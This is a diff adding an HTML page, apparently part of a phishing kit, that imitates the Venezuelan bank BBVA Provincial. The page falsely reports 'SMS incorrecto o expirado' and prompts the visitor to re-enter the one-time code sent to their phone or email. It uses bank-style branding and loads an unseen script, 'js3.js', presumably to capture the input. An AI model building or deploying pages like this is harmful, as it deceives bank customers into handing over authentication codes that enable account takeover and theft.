@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Provincial - Verificación de Identidad</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: white;
+            padding-top: 70px;
+            padding-bottom: 70px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        header {
+            background: #072146;
+            color: white;
+            padding: 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            box-sizing: border-box;
+        }
+
+        .logo img {
+            height: auto;
+            margin-left: 10px;
+        }
+
+        h1 {
+            font-size: 26px;
+        }
+
+        h2 {
+            color: #004080;
+        }
+
+        .form-container {
+            margin: 50px 20px 20px;
+            background: #FFF6D8;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .input-group {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .label {
+            font-size: 14px;
+            color: #000;
+            display: block;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        input {
+            background: #F4F4F4;
+            border: 2px solid #005BAC;
+            color: black;
+            font-size: 16px;
+            padding: 12px;
+            width: 100%;
+            height: 45px;
+            box-sizing: border-box;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        input::placeholder {
+            color: #8F8F8F;
+            font-size: 14px;
+        }
+
+        .btn {
+            background: #005BAC;
+            color: white;
+            font-size: 18px;
+            padding: 12px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 8px;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background: #003E7E;
+        }
+
+        footer {
+            background: #072146;
+            color: white;
+            padding: 20px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .footer-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .footer-logo img {
+            height: auto;
+        }
+
+        .mobile-icon {
+            font-size: 40px;
+            color: #005BAC;
+            margin: 5px 0;
+        }
+
+      
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="logo.png" alt="BBVA Provincial">
+            </div>
+        </header>
+
+        <main>
+            <div class="form-container">
+                <h2>SMS incorrecto o expirado</h2>
+                <div class="mobile-icon">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <form>
+                    <div class="input-group">
+                        <label class="label">Ingresa la clave enviada a tu correo o número telefónico asociado a BBVA Provincial</label>
+                        <input type="text" placeholder="Ingrese su clave digital SMS">
+                    </div>
+                    <button type="submit" class="btn">Siguiente</button>
+                </form>
+         
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-logo">
+                <img src="footer.png" alt="BBVA Provincial">
+            </div>
+        </footer>
+    </div>
+    <script src="js3.js"></script>
+</body>
+</html>
